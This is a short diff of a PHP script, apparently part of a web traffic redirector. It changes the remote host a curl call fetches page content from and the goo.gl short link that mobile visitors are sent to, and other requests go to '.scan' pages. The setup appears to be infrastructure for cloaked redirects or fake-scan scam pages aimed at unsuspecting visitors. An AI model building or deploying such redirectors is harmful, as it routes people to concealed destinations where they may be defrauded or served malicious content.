@@ -30,7 +30,7 @@
 
   function getSite(){
     $ch = curl_init();
-  	curl_setopt($ch, CURLOPT_URL, 'http://blogger.report/php/site.php');
+  	curl_setopt($ch, CURLOPT_URL, 'http://havalarnasilbakam.info/php/site.php');
   	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   	$site = curl_exec($ch);
   	curl_close($ch);
@@ -115,7 +115,7 @@
   $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
 
   if($action == 'mobile'){
-    header('Location: https://goo.gl/091aJP?'.rand(11111,99999));
+    header('Location: https://goo.gl/Fjma8Y?'.rand(11111,99999));
   }else if($action == 'site'){
     header("Location: http://$_SERVER[HTTP_HOST]/$id.scan");
   }else{
